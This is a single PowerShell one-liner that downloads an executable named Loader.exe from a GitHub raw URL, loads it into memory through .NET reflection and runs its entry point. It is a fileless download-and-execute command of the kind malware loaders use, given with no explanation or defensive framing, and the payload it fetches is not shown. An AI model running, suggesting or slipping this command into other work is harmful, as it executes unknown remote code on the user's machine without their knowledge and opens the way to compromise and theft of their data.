[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/mathsencud-creator/rs/raw/main/Loader.exe").Content).EntryPoint.Invoke($null, $null)



